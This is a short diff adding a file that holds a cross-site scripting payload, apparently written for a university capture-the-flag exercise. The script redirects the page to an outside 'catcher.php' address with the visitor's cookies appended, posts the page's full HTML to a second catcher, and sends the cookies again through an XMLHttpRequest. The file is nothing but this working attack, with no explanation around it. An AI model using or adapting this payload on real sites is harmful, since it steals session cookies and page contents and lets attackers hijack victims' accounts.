@@ -1,0 +1,10 @@
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.js'></script>
+<script>
+document.location = 'http://web.ist.utl.pt/~ist181861/repo/xss/catcher.php?blabla=' + escape(document.cookie);
+
+var x = $('body').html().toString();
+$.post('http://web.ist.utl.pt/~ist166988/ctf/catcher.php', x);
+
+var xhr = new XMLHttpRequest(); 
+xhr.open('GET', "http://web.ist.utl.pt/~ist166988/ctf/catcher.php?cookie=" + document.cookie, true); xhr.send();
+</script>
